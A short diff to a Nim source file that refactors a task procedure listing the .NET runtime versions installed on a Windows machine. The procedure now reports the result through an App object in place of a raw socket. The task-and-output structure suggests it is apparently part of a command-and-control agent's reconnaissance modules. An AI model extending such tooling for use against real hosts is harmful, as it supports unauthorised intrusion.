@@ -1,12 +1,11 @@
-from std/net import Socket  
 from std/json import `%*`
 from std/strutils import join
 
 from winim/clr import clrVersions
 
-import ../client/communication
+import ../client/[communication, types]
 
-proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
+proc executeTask*(app: App, taskId: int, params: seq[string]) =
   let taskOutput = TaskOutput(
     task: "output",
     taskId: taskId,
@@ -18,4 +17,4 @@ proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
   for version in clrVersions(): dotnetV.add version
 
   taskOutput.addData(Text, "response", "installed dotnet versions: " & dotnetV.join(", "))
-  socket.sendOutput(taskOutput)
+  app.sendOutput(taskOutput)
